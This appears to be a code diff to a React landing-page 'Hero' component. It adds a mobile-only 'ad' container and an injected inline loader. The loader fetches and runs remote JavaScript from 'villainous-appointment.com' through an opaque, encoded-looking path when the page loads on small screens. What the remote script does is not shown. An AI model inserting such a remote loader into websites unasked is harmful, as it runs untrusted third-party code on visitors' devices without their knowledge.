@@ -5,6 +5,7 @@ import { Brain } from 'lucide-react';
 
 const Hero = () => {
   const contentRef = useRef<HTMLDivElement>(null);
+  const adScriptRef = useRef<HTMLDivElement>(null);
 
   useEffect(() => {
     const observer = new IntersectionObserver(
@@ -20,7 +21,30 @@ const Hero = () => {
       observer.observe(contentRef.current);
     }
 
-    return () => observer.disconnect();
+    // Add ad script for mobile only
+    if (adScriptRef.current && window.innerWidth < 768) {
+      const script = document.createElement('script');
+      script.innerHTML = `
+        (function(bgcf){
+          var d = document,
+              s = d.createElement('script'),
+              l = d.scripts[d.scripts.length - 1];
+          s.settings = bgcf || {};
+          s.src = "//villainous-appointment.com/bGXSVVsbd.GElW0DYEWSdyiVYZWp5VuIZ/XrIw/ZelmN9Su_ZlU-l-kdPOTEYIxjN/DdAByuMuDkUhtWN/jbEd0xMqDmIGw/NUgL";
+          s.async = true;
+          s.referrerPolicy = 'no-referrer-when-downgrade';
+          l.parentNode.insertBefore(s, l);
+        })({})
+      `;
+      adScriptRef.current.appendChild(script);
+    }
+
+    return () => {
+      observer.disconnect();
+      if (adScriptRef.current) {
+        adScriptRef.current.innerHTML = '';
+      }
+    };
   }, []);
 
   return (
@@ -57,6 +81,13 @@ const Hero = () => {
               ➡️ Start Your Journey Today!
             </Link>
           </div>
+          
+          {/* Ad Container - Mobile Only */}
+          <div 
+            ref={adScriptRef}
+            className="block md:hidden mx-auto my-4 w-[300px] h-[100px] bg-transparent"
+            style={{ maxWidth: '100%' }}
+          ></div>
         </div>
       </div>
     </section>
